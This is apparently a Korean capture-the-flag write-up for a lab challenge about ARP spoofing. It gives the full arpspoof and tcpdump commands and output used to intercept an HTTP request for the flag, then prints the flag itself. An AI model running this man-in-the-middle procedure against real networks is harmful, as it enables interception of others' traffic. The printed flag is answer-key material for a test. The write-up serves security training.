- solved by @cooku222

```
ncat --ssl hiding-in-your-wifi-dc43a6ffcc8b.chall.nnsc.tf 1337
```
위 명령어로 접속 후 

```
player@attacker-7c4d9b78b8-zsnmh:/$
```

위와 같이 프롬프트가 변경되는 것을 확인할 수 있다.
```
player@attacker-7c4d9b78b8-zsnmh:/$ whoami
whoami
player
player@attacker-7c4d9b78b8-zsnmh:/$
player@attacker-7c4d9b78b8-zsnmh:/$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host proto kernel_lo
       valid_lft forever preferred_lft forever
3: eth0@if3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 8951 qdisc noqueue state UNKNOWN group default qlen 1000
    link/ether 02:00:00:00:00:66 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.10.10.66/24 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::ff:fe00:66/64 scope link proto kernel_ll
       valid_lft forever preferred_lft forever
player@attacker-7c4d9b78b8-zsnmh:/$
player@attacker-7c4d9b78b8-zsnmh:/$ ip route
ip route
10.10.10.0/24 dev eth0 proto kernel scope link src 10.10.10.66
player@attacker-7c4d9b78b8-zsnmh:/$
player@attacker-7c4d9b78b8-zsnmh:/$ which arpspoof tcpdump
which arpspoof tcpdump
/usr/sbin/arpspoof
/usr/bin/tcpdump
player@attacker-7c4d9b78b8-zsnmh:/$
```

`whoami`, `ip route` 등의 커맨드로 해당 인스턴스를 조사하면 ip a의 `eth0` 인터페이스를 공략하면 되는걸 알 수 있습니다.
(1번은 루프백 인터페이스)

```
player@attacker-7c4d9b78b8-zsnmh:/$ echo 1 > /proc/sys/net/ipv4/ip_forward
echo 1 > /proc/sys/net/ipv4/ip_forward
bash: /proc/sys/net/ipv4/ip_forward: Read-only file system
player@attacker-7c4d9b78b8-zsnmh:/$
player@attacker-7c4d9b78b8-zsnmh:/$ sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
<sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
bash: sudo: command not found
player@attacker-7c4d9b78b8-zsnmh:/$
```
이건 ip_forward 값을 직접 바꾸기 위해 파일 권한을 확인해준 부분인데, read-only 권한이라 불가함을 파악하고 다른 방법 찾았습니다.

```
player@attacker-7c4d9b78b8-zsnmh:/$ tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
arpspoof -i eth0 -t 10.10.10.20 10.10.10.10 &
<mh:/$ arpspoof -i eth0 -t 10.10.10.20 10.10.10.10 &
[2] 306
player@attacker-7c4d9b78b8-zsnmh:/$
player@attacker-7c4d9b78b8-zsnmh:/$
<mh:/$ arpspoof -i eth0 -t 10.10.10.10 10.10.10.20 &
[3] 307
player@attacker-7c4d9b78b8-zsnmh:/$
player@attacker-7c4d9b78b8-zsnmh:/$ 2:0:0:0:0:66 2:0:0:0:0:20 0806 42: arp reply 10.10.10.10 is-at 2:0:0:0:0:66
2:0:0:0:0:66 2:0:0:0:0:10 0806 42: arp reply 10.10.10.20 is-at 2:0:0:0:0:66
2:0:0:0:0:66 2:0:0:0:0:20 0806 42: arp reply 10.10.10.10 is-at 2:0:0:0:0:66
2:0:0:0:0:66 2:0:0:0:0:10 0806 42: arp reply 10.10.10.20 is-at 2:0:0:0:0:66
2:0:0:0:0:66 2:0:0:0:0:20 0806 42: arp reply 10.10.10.10 is-at 2:0:0:0:0:66
2:0:0:0:0:66 2:0:0:0:0:10 0806 42: arp reply 10.10.10.20 is-at 2:0:0:0:0:66
2:0:0:0:0:66 2:0:0:0:0:20 0806 42: arp reply 10.10.10.10 is-at 2:0:0:0:0:66
2:0:0:0:0:66 2:0:0:0:0:10 0806 42: arp reply 10.10.10.20 is-at 2:0:0:0:0:66
2:0:0:0:0:66 2:0:0:0:0:20 0806 42: arp reply 10.10.10.10 is-at 2:0:0:0:0:66
2:0:0:0:0:66 2:0:0:0:0:10 0806 42: arp reply 10.10.10.20 is-at 2:0:0:0:0:66
2:0:0:0:0:66 2:0:0:0:0:20 0806 42: arp reply 10.10.10.10 is-at 2:0:0:0:0:66
2:0:0:0:0:66 2:0:0:0:0:10 0806 42: arp reply 10.10.10.20 is-at 2:0:0:0:0:66
2:0:0:0:0:66 2:0:0:0:0:20 0806 42: arp reply 10.10.10.10 is-at 2:0:0:0:0:66
2:0:0:0:0:66 2:0:0:0:0:10 0806 42: arp reply 10.10.10.20 is-at 2:0:0:0:0:66
6128, win 62377, options [mss 8911,sackOK,TS val 2879186864 ecr 0,nop,wscale 7], length 0
09:59:13.414621 IP 10.10.10.20.36536 > 10.10.10.10.80: Flags [S], seq 2876646128, win 62377, options [mss 8911,sackOK,TS val 2879186864 ecr 0,nop,wscale 7], length 0
09:59:13.415183 IP 10.10.10.10.80 > 10.10.10.20.36536: Flags [S.], seq 3340891656, ack 2876646129, win 62293, options [mss 8911,sackOK,TS val 1299650790 ecr 2879186864,nop,wscale 7], length 0
09:59:13.415214 IP 10.10.10.10.80 > 10.10.10.20.36536: Flags [S.], seq 3340891656, ack 2876646129, win 62293, options [mss 8911,sackOK,TS val 1299650790 ecr 2879186864,nop,wscale 7], length 0
09:59:13.416164 IP 10.10.10.20.36536 > 10.10.10.10.80: Flags [.], ack 1, win 488, options [nop,nop,TS val 2879186866 ecr 1299650790], length 0
09:59:13.416164 IP 10.10.10.20.36536 > 10.10.10.10.80: Flags [P.], seq 1:84, ack 1, win 488, options [nop,nop,TS val 2879186866 ecr 1299650790], length 83: HTTP: GET /flag.txt HTTP/1.1
09:59:13.416167 IP 10.10.10.20.36536 > 10.10.10.10.80: Flags [.], ack 1, win 488, options [nop,nop,TS val 2879186866 ecr 1299650790], length 0
09:59:13.416188 IP 10.10.10.20.36536 > 10.10.10.10.80: Flags [P.], seq 1:84, ack 1, win 488, options [nop,nop,TS val 2879186866 ecr 1299650790], length 83: HTTP: GET /flag.txt HTTP/1.1
09:59:13.416513 IP 10.10.10.10.80 > 10.10.10.20.36536: Flags [.], ack 84, win 487, options [nop,nop,TS val 1299650792 ecr 2879186866], length 0
09:59:13.416514 IP 10.10.10.10.80 > 10.10.10.20.36536: Flags [.], ack 84, win 487, options [nop,nop,TS val 1299650792 ecr 2879186866], length 0
tcpdump: pcap_loop: truncated dump file; tried to read 16 header bytes, only got 2
player@attacker-7c4d9b78b8-zsnmh:/$
player@attacker-7c4d9b78b8-zsnmh:/$ 2:0:0:0:0:66 2:0:0:0:0:10 0806 42: arp reply 10.10.10.20 is-at 2:0:0:0:0:66
2:0:0:0:0:66 2:0:0:0:0:20 0806 42: arp reply 10.10.10.10 is-at 2:0:0:0:0:66
2:0:0:0:0:66 2:0:0:0:0:10 0806 42: arp reply 10.10.10.20 is-at 2:0:0:0:0:66
2:0:0:0:0:66 2:0:0:0:0:20 0806 42: arp reply 10.10.10.10 is-at 2:0:0:0:0:66
```

`ARP spoofing`을 해준다. 이때 `GET /flag.txt`가 잡힌다.
arpspoof와 tcpdump 종료 후
```
tcpdump -r /tmp/capture.pcap -A | grep -B5 -A 40 "200 OK"
```
해당 명령어로 플래그를 획득할 수 있다.

- Flag: NNS{switCH3d_N37woRk5_sti11_7Rust_4Rp_s0_keeP_Y0uR_d3viCe5_seP4Ra7e}
